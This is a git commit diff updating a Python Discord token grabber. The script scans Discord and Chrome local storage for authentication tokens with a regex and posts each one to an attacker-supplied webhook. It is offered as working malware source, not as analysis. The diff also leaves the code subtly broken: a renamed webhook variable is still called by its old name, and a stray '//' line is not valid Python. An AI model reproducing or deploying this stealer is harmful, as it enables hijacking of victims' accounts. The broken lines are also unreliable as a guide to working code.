a968e3bd30b4f5d338ac72e6aef48eea1c56e748
fweak1337 <freakgamer2331@gmail.com>
2020-03-25 23:39:54 -0700

    Update main.py

--- Grabber/main.py
+++ Grabber/main.py
@@ -1,7 +1,20 @@
 import os, re, requests
 
-webhook = "YOUR WEBHOOK URL"
-dirs = [os.environ.get("APPDATA") + "\\Discord\\Local Storage\\leveldb", os.environ.get("APPDATA") + "\\discordcanary\\Local Storage\\leveldb", os.environ.get("USERPROFILE") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb"]
+WEBHOOK = "YOUR WEBHOOK URL"
+APPDATA = os.environ.get("APPDATA")
+
+dirs = [
+f"{APPDATA}\\Discord\\Local Storage\\leveldb", 
+f"{APPDATA}\\discordcanary\\Local Storage\\leveldb", 
+f"{os.environ.get('USERPROFILE')}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb"
+]
+
+def post(hook:str, message:str):
+    _payload = {
+        "content": f'```\n{message}```'   
+    }
+    requests.post(hook, json=_payload)
+
 for location in dirs:
     for file in os.listdir(location):
         with open(f"{location}\\{file}", encoding='utf-8', errors='ignore') as _data:
@@ -9,6 +22,18 @@ for location in dirs:
                 regex = re.findall(r"[MN][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}", _data.read())
                 if regex:
                     for reg in regex:
-                        requests.post(webhook, json={'content': reg});
+                        post(webhook, reg);
             except PermissionError:
                 continue
+input(" Press enter to close" )
+
+
+
+
+
+
+
+
+
+
+// Specwiel tanks to /xanthe1337
